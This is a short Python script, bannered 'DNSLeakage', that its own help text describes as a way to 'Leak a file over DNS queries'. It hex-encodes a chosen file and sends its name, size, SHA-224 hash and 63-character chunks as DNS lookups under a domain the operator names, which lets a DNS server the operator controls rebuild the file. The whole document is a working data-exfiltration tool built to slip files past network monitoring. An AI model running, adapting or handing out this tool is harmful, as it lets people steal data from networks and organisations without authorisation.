import socket
import sys
import argparse
import hashlib
import binascii


def sending(addressed,host):
    send = str(addressed) + host
    try:
        print('Sending DNS query:',send)
        a = socket.gethostbyname(str(send))
    except Exception:
        pass

def hostConvert():
    newhost = ''
    for a in args["domain"].split('.')[1:]:
        newhost = newhost+'.'+a
    return newhost
	
def opening():
	string = """
'||''|.   '|.   '|'  .|'''.|  '||'                      '||                              
 ||   ||   |'|   |   ||..  '   ||         ....   ....    ||  ..   ....     ... .   ....  
 ||    ||  | '|. |    ''|||.   ||       .|...|| '' .||   || .'   '' .||   || ||  .|...|| 
 ||    ||  |   |||  .     '||  ||       ||      .|' ||   ||'|.   .|' ||    |''   ||      
.||...|'  .|.   '|  |'....|'  .||.....|  '|...' '|..'|' .||. ||. '|..'|'  '||||.  '|...' 
                                                                         .|....'         
                                                                                         
"""
	print(string)

opening()
parser = argparse.ArgumentParser(description='Leak a file over DNS queries')
parser.add_argument("-F","--file",help="File path and name", required=True)
parser.add_argument("-D","--domain", help="Domain address of the target DNS server", required=True)
args = vars(parser.parse_args())

FixedWindow = 63
host = hostConvert()
hasher = hashlib.sha224()

#Hashing the file for integrity (signature)
with open(args["file"], 'rb') as afile:
    buf = afile.read()
    hasher.update(buf)
with open(args["file"], 'rb') as my_file:
    hexed = binascii.hexlify(my_file.read()).decode('utf-8')#hexed = my_file.read().hex() #Encodes the file to Hex
    i=0
    if (len(hexed)%FixedWindow > 0.0):
        i=1
    sending('newfile',host) #New file - Server should acknowledge for new file afterwards
    sending(args["file"].split("\\")[-1].encode().hex(),host) #Sends file name
    sending(len(hexed),host) # Send file size
    sending(hasher.hexdigest(),host) # Send file signature
    for n in range(0, int(len(hexed)/FixedWindow)+i): #Send file by frame - FixedWindow=(63)
        index = n * FixedWindow
        send = hexed[index:index+FixedWindow]
        sending(send,host)
print('Done')

